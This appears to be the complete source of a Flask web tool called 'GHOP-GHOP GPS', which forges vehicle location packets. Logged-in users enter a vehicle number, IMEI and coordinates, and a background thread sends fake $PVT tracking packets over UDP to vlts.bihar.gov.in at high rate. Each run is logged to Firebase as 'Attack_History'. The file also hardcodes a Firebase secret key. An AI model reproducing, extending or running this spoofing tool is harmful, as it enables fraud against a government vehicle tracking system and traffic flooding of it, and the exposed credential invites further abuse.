import os, socket, threading, time, requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_final_whatsapp_edition"

FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"

TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "25.298801", "lon": "84.651033", "last_pkt": "Ready..."}

DASH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - DASHBOARD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
        #map { height: 300px; width: 100%; max-width: 480px; border: 2px solid #0f0; border-radius: 15px; }
        .metric { font-size: 50px; color: #fff; margin: 10px 0; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input { width: 94%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; }
        .stop { background: #800; color: #fff; }
        .reset { background: #333; color: #fff; border: 1px solid #444; }
        .gps { background: #004466; color: #fff; border: 1px solid #00ffff; }
        .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; }
    </style>
</head>
<body>
    <div class="box">
        <form action="/logout" method="post"><button style="color:red; background:none; border:1px solid red; padding:5px; cursor:pointer; font-size:10px;">LOGOUT: {{session['user']}}</button></form>
        <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
        <div class="metric" id="cnt">0</div>
        
        <form action="/action" method="post" class="grid" id="mainForm">
            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{vno}}" oninput="this.value = this.value.toUpperCase(); updatePreview();" onblur="checkVehicle()"></div>
            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}" oninput="updatePreview();"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updatePreview();"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updatePreview();"></div>
            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
            
            {% if session['access_level'] == 'pro' %}
            <div class="full"><label>📋 PACKET PREVIEW (MIJO FORMAT)</label><div class="preview" id="preview">Ready...</div></div>
            {% endif %}

            <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
            <button class="btn reset full" name="btn" value="reset">🔄 RESET ALL</button>
        </form>
    </div>
    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([{{lat or 25.298801}}, {{lon or 84.651033}}], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker = L.marker([{{lat or 25.298801}}, {{lon or 84.651033}}]).addTo(map);

        function updateMap(lat, lon) {
            let pos = [parseFloat(lat), parseFloat(lon)];
            map.setView(pos, 15);
            marker.setLatLng(pos);
        }

        function updatePreview() {
            let imei = document.getElementById('imei').value;
            let vno = document.getElementById('vno').value;
            let lat = parseFloat(document.getElementById('lat').value || 0).toFixed(6);
            let lon = parseFloat(document.getElementById('lon').value || 0).toFixed(6);
            let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
            let t = new Date().toLocaleTimeString('en-GB', {hour12:false}).replace(/:/g, '');
            let str = `$PVT,RA18,1.ONTC,NR,01,L,${imei},${vno},1,${d},${t},${lat},N,${lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*`;
            let pre = document.getElementById('preview');
            if(pre) pre.innerText = str;
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    let lt = pos.coords.latitude.toFixed(6);
                    let ln = pos.coords.longitude.toFixed(6);
                    document.getElementById('lat').value = lt;
                    document.getElementById('lon').value = ln;
                    updateMap(lt, ln); // FIXED: Marker will now move
                    updatePreview();
                }, (err) => alert("Browser Error: " + err.message));
            } else { alert("Location not supported by browser."); }
        }

        async function checkVehicle() {
            let vno = document.getElementById('vno').value.toUpperCase().trim();
            if(!vno) return;
            let res = await fetch(`/check_vehicle?vno=${vno}`);
            let data = await res.json();
            if(data.imei) { 
                document.getElementById('imei').value = data.imei;
                document.getElementById('lat').value = data.lat;
                document.getElementById('lon').value = data.lon;
                updateMap(data.lat, data.lon);
                updatePreview();
            }
        }

        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count.toLocaleString();
            });
        }, 1000);
        updatePreview();
    </script>
</body>
</html>
"""

def log_to_firebase():
    try:
        now = datetime.now()
        date_key = now.strftime('%Y-%m-%d')
        time_key = now.strftime('%H%M%S')
        user_id = session.get('user')
        vno = status["vno"]
        log_data = {"Vehicle_No": vno, "IMEI_No": status["imei"], "User": user_id, "Lat": status["lat"], "Lon": status["lon"], "Last_Sync": now.strftime('%Y-%m-%d %H:%M:%S'), "Status": "Active"}
        
        # Attack History Fix: Ensure both Records and History are saved correctly
        requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data, timeout=5)
        requests.put(f"{FB_URL}/Attack_History/{date_key}/{user_id}/{vno}/{time_key}.json?auth={FB_SECRET}", json=log_data, timeout=5)
    except: pass

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    while status["firing"]:
        try:
            tag = TAG_LIST[status["count"] % len(TAG_LIST)]
            now = datetime.now()
            pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{status['lat']},N,{status['lon']},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*".encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(pkt, target)
            status["count"] += 1
            sock.close()
            time.sleep(0.02)
        except: time.sleep(1)

@app.route('/', methods=['GET', 'POST'])
def login():
    if 'user' in session: return redirect(url_for('dashboard'))
    error = None
    if request.method == 'POST':
        uid = request.form.get('userid', '').strip()
        pw = request.form.get('password', '').strip()
        r = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}")
        data = r.json()
        if data and str(data.get('password')) == str(pw):
            session['user'] = uid
            session['access_level'] = data.get('access_level', 'basic')
            session['def_lat'] = str(data.get('lat', '25.298801'))
            session['def_lon'] = str(data.get('lon', '84.651033'))
            status.update({"lat": session['def_lat'], "lon": session['def_lon']})
            return redirect(url_for('dashboard'))
        else: error = "INVALID ID OR PASSWORD"
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(DASH_HTML, session=session, **status)

@app.route('/check_vehicle')
def check_vehicle():
    vno = request.args.get('vno', '').upper().strip()
    r = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}")
    data = r.json()
    if data: return jsonify({"imei": data.get('IMEI_No'), "lat": data.get('Lat'), "lon": data.get('Lon')})
    return jsonify({"imei": None})

@app.route('/action', methods=['POST'])
def action():
    if 'user' not in session: return redirect(url_for('login'))
    val = request.form.get('btn')
    if val == "reset":
        status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": session.get('def_lat'), "lon": session.get('def_lon')})
    elif val == "start" and not status["firing"]:
        status.update({"imei": request.form.get('imei', '').strip(), "vno": request.form.get('vno', '').upper().strip(), "lat": request.form.get('lat', '').strip(), "lon": request.form.get('lon', '').strip(), "firing": True})
        log_to_firebase() # <--- FIXED HISTORY LOGGING
        threading.Thread(target=firing_engine, daemon=True).start()
    elif val == "stop": status["firing"] = False
    return redirect(url_for('dashboard'))

@app.route('/data')
def data(): return jsonify(status)

@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
